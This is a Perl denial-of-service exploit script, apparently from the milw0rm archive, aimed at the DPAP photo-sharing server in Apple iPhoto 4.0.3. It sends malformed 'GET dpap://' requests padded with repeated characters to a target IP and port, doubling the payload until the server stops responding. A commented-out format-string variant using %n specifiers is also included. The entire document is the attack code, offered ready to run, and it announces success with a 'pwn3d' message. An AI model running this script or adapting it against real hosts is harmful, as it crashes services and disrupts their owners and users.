<html><head><title>Apple iPhoto 4.0.3 DPAP Server Denial of Service	Exploit</title></head><pre>#!/usr/bin/perl
# crash the iPhoto DPAP (Digital Photo Access Protocol) Server on  
iPhoto 4.0.3
# technically the server exits cleanly but it does not restart

use IO::Socket::INET;

die &quot;Usage $0 &lt;target_ip&gt;\n&quot; unless ($ARGV[0]);

$| = 1;

if ($ARGV[1]) {
     $port = $ARGV[1];
} else {
     $port = 8770;
}

$socket=new IO::Socket::INET-&gt;new(PeerAddr=&gt;$ARGV[0],
                                   PeerPort=&gt;$port,
                                   Proto=&gt;'tcp');

if ($socket == NULL) {
    die &quot;Cannot connect to $ARGV[0] on port $port\n&quot;;
}


$malformed_data = &quot;AAAAAAAAAAAAAAA&quot;;
#$malformed_data = &quot;%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n&quot;;
$count = 0;

$msg=&quot;GET dpap://$malformed_data HTTP/1.1\r\n\r\n&quot;;
print &quot;Sending message:\n$msg\n&quot;;
$socket-&gt;send($msg);
$socket-&gt;close();
sleep(1);
$cont = 1;

# this loop is unnecessary but who cares
while ($cont &amp;&amp; $count &lt; 11) {
     $socket2 = new IO::Socket::INET-&gt;new(PeerAddr=&gt;$ARGV[0],  
PeerPort=&gt;$port, Proto=&gt;'tcp');
     if ($socket2 == NULL) {
         $cont = 0;
         print &quot;crash\n&quot;;
     } else {
         print &quot;.&quot;;
	# next line not necessary but does the job too
	$malformed_data = $malformed_data.$malformed_data;
         $msg=&quot;GET dpap://$malformed_data HTTP/1.1\r\n\r\n&quot;;
         $socket2-&gt;send($msg);
         $count++;
         $socket2-&gt;close();
         sleep(1);
     }
}

if ($count &lt; 10) {
     print &quot;iPhotoDPAPServer on $ARGV[0] has been pwn3d\n&quot;;
} else {
     print &quot;Unable to crash iPhotoDPAPServer on $ARGV[0]\n&quot;;
}

# milw0rm.com [2008-02-18]</pre></html>